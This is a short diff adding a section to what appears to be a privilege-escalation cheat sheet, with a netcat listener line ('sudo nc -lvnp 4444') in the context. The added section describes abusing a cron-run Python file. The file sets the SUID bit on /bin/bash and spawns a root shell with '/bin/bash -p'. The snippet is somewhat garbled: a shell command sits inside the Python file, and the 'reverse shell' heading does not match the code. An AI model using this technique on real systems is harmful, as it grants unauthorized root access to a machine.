@@ -255,3 +255,14 @@ sh GNU Screen 4.5.0 - Local Privilege Escalation.py
  sudo nc -lvnp 4444
  ```````````````````````````
  
+ 
+# 16. /etc/crontab
+  make reverse shell in crontab python file
+ `````````
+ /var/.file.py
+ 
+ #!/usr/bin/python3
+import  os
+os.system("chmod +s /bin/bash")
+/bin/bash -p
+````````````````````````````
